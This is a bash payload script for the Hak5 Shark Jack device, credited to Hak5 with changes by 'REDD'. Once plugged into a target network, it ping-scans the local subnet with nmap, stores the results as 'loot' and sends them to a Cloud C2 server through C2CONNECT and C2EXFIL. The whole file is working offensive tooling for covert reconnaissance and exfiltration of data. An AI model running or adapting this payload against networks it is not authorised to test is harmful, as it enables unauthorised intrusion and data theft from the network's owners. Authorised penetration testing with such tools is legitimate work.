#!/bin/bash
#
# Title:         Nmap Payload for Shark Jack w/ C2
# Author:        Hak5 (modifications from REDD)
# Version:       1.0
#
# All credit goes to Hak5 Team. I just through in a simple check for if
# C2 is provisioned in the SharkJack. - If so, exfiltrate! 
#
# Scans target subnet with Nmap using specified options. Saves each scan result
# to loot storage folder. Exfiltrates all scans to C2 if provisioned.
#
# Red ...........Setup
# Amber..........Scanning
# White..........Exfiltrating to C2
# Green..........Finished
#
# See nmap --help for options. Default "-sP" ping scans the address space for
# fast host discovery.

C2PROVISION="/etc/device.config"
NMAP_OPTIONS="-sP"
LOOT_DIR=/root/loot/nmap
SCAN_DIR=/etc/shark/nmap



function finish() {

	LED CLEANUP
	# Kill Nmap
	wait $1
	kill $1 &> /dev/null

	# Sync filesystem
	echo $SCAN_M > $SCAN_FILE
	sync
	sleep 1

	# C2 Connect and send files
	if [[ -f "$C2PROVISION" ]]; then
		LED W FAST
		c2_connect
		sleep 1
	fi

	LED FINISH
	sleep 1

	# Halt system
	halt
}

function setup() {
	LED SETUP
	# Create loot directory
	mkdir -p $LOOT_DIR &> /dev/null
	
	# Set NETMODE to DHCP_CLIENT for Shark Jack v1.1.0+
	NETMODE DHCP_CLIENT
	# Wait for an IP address to be obtained - Blink cyan while waiting for IP
	while ! ifconfig eth0 | grep "inet addr"; do sleep 1;LED C SOLID;sleep .1;LED SETUP; done

	# Create tmp scan directory
	mkdir -p $SCAN_DIR &> /dev/null

	# Create tmp scan file if it doesn't exist
	SCAN_FILE=$SCAN_DIR/scan-count
	if [ ! -f $SCAN_FILE ]; then
		touch $SCAN_FILE && echo 0 > $SCAN_FILE
	fi

	i=0
	# Find IP address and subnet
	while [ -z "$SUBNET" ]; do
		sleep 1 && find_subnet
	done
}

function find_subnet() {
	SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
}

function c2_connect() {
	if [[ -f "$C2PROVISION" ]]; then
		# Connect to Cloud C2
		C2CONNECT

		# Wait until Cloud C2 connection is established
		while ! pgrep cc-client; do sleep 1; done

		# Exfiltrate all test loot files
		FILES="$LOOT_DIR/*.txt"
		for f in $FILES; do C2EXFIL STRING $f Nmap-C2-Example; done
	else
		# Exit script if not provisioned for C2
		LED R SOLID
		exit 1
	fi
}

function run() {
	# Run setup
	setup

	SCAN_N=$(cat $SCAN_FILE)
	SCAN_M=$(( $SCAN_N + 1 ))

	LED ATTACK
	# Start scan
	nmap $NMAP_OPTIONS $SUBNET -oN $LOOT_DIR/nmap-scan_$SCAN_M.txt &>/dev/null &
	tpid=$!

	finish $tpid
}


# Run payload
run &
